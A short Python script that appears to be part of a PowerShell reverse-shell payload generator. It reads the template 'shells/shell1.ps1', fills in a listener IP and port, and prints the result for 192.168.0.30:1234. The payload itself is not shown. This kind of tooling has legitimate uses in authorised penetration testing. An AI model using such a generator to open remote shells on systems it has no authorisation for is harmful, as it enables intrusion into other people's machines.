def shell1 ( ip, port ):
    # Read in the file
    with open('shells/shell1.ps1', 'r') as file:
        filedata = file.read()

    # Replace the target string
    filedata = filedata.replace('ipaddr', ip)
    filedata = filedata.replace('rport', port)
    return filedata


print(shell1('192.168.0.30', '1234'))
